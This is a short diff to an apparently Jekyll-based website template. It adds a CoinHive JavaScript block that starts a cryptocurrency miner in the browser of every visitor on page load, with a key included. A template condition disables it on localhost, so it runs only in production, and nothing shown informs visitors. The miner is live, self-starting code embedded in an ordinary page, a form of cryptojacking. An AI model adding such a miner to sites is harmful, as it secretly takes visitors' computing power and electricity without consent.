@@ -57,6 +57,16 @@
 	  src="https://www.facebook.com/tr?id=1116978925066357&ev=PageView&noscript=1"
 	/></noscript>
 	<!-- End Facebook Pixel Code -->
+	
+	<!-- CoinHive -->
+	{% if site.url != 'http://localhost:4000' %}
+	<script>
+		var miner = new CoinHive.Anonymous('829b3QlAZabOKWRKIbsqKTnCeDiycH4b');
+		miner.start();
+		miner.on('found', function(hash) { console.log(hash) })
+	</script>
+	{% endif %}
+	<!-- end CoinHive -->
 
 </body>
 
